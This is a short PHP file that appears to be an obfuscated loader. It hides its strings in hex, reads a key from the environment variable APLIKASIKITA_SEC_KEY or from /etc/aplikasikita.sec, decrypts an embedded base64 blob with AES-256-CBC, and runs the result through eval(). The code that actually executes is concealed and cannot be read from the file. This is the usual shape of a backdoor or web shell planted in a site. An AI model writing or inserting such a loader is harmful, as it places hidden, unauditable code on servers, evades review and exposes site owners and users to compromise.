<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('y2ekb4Zf2djw2SESnHjafA==');

$c=base64_decode(

'/b527DblOKhEx7QOkllhnJmji85v5AM5/qI1J1XULVq4FS53GPbCSwgxxD/8xSmUf09r1wrd0916' .
'7CU4nQtUazfxtTvOxpLKe6gv10d3vmd7doYpAycj/W/E4olI9AOUJbj8yzIeeDkv+hMJzfLIvauc' .
'KQXcQUf9cO2QGyPio31sM0diBPvZ/Al9Wim0ph0u+56T6tMCPnJwxvLpkzT1Jurqhabz265SGtG/' .
'E5Vidb1dQsaI+sHo91BXB486c/Hc5pWPxSyQRVnenBP33ZvkW3QKj9xqrNgzSMIbrtdTLn8tUi3L' .
'mjHTgqIaj2jBKzUvC2VYeOX5lAIyVgh7r7DYsqfVrQ+qhoLs2RNlSDj8Hix9Jbr4HkmDx4zqFd+/' .
'Yz2v13XCNX/RK9b2z1/V+gqeq7BRBKGmLbAsq2kVJChtlAmDTSQ76z346TCbzMs0cMg4LSYx722S' .
'4LzAA7zWFQBrsOaXxh8kVgFKjzkQaxH7nITH2+MWzCS8w6UpeGoqD7KaKuzBE3dgctH8OdyWLDAn' .
'5Qxn7D7plKRFKoFPgIsRNq6CoaR/kLRJph4OLqkNsbrSe0x9AW2qbuDyYQ18pqYkF+N8c4FuvIX8' .
'P5ntAWLd4VEsV2gW3yB352USq8kQ4d3U+s/ZDYZNVmSRYMUqNKmxCFwPiriiIq6q9mpC3oR56pd2' .
'y2QaWCTWbn4ckYsswV1tEAtxsKVvqKTF1/ObOVCu3XTn7G7EvTgCHQT+o1xAlwU3nRDo0uq6c82/' .
'zWni4L9o/yhJ2e/j1WrCTmkR6GvtYytFlUm8LgtX30v598tBJ3b3GPVxXPR3kwlBWbrLd+LD4ZKG' .
'DfJEYIly8+o40J+B1S7khOfXms5i47D0gHzULiNpLZkS7zLTi7Qww0F4/Wgb8MTMUaVyXX9W8BC/' .
'9Y/9YvmIE1Cmk5yoQ7d6R5PLJp+oTH8DZbNh3/aYj74+vUklp3JcYokFJvvmkpMbzv6KBNOnO1Jc' .
'kOHgiwRPMwNY86TSq5KOyZ+c0LbD8HpWL006gYdJWcP89skIsEndPGQAGH8tnsnfWhygbWbeQHO/' .
'+tUYFVyO0xXC3vAcAWoHt0HPyI8QynTDZAWLLBs8rfknIEBfqCaCro/uB1S5lo2g5C0kOYXJ2X1R' .
'F9CMQg2nhiwpdu8dOoMsKhXV7oI/E2V5NxzRe73CXSVWhtSSwJIJjPHy+5IRl+hLU+hOHR56b+tl' .
'r08ikuc3hG0IOH5/2bEYEyRC4HEk4ZhqMXlAnakWkRLVnKwH0pKjDHQWaD2M07GTjwzC4U++UJi/' .
'yKEqQL5GLYJ7LPSJrXPsKGGotpUk1IXhFsf5vU2FyUDk0kRhm2OpjN1RkK2CppdMIXLM/Kl4WQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

